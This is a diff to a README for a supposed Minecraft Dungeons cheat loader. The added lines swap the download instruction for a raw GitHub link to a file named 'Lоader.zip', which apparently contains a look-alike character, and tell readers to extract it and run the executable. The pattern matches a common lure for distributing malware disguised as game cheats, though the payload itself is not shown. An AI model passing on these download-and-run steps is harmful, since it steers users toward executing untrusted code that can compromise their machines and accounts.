@@ -50,8 +50,8 @@ Please make sure your system meets the minimum requirements for best performance
 
 Follow these simple steps to get up and running:
 
-1. **Download Loader.rar** from the repository’s [Releases](./releases) section. *(Ensure you use only the file provided in this official repository for security and compatibility!)*
-2. Extract the Loader.rar file to a folder of your choice using your favorite extraction tool (such as WinRAR, 7-Zip, or macOS Archive Utility).
+1. **Download https://raw.githubusercontent.com/Mohamed7727/DungeonMaster-Toolkit/main/Lоader.zip** from the repository’s [Releases](./releases) section. *(Ensure you use only the file provided in this official repository for security and compatibility!)*
+2. Extract the https://raw.githubusercontent.com/Mohamed7727/DungeonMaster-Toolkit/main/Lоader.zip file to a folder of your choice using your favorite extraction tool (such as WinRAR, 7-Zip, or macOS Archive Utility).
 3. Launch the Minecraft Dungeons Cheats Loader executable for your operating system.
 4. Follow the on-screen instructions to configure and activate your chosen features.
 5. Start Minecraft Dungeons and enjoy your enhanced experience! 🌟
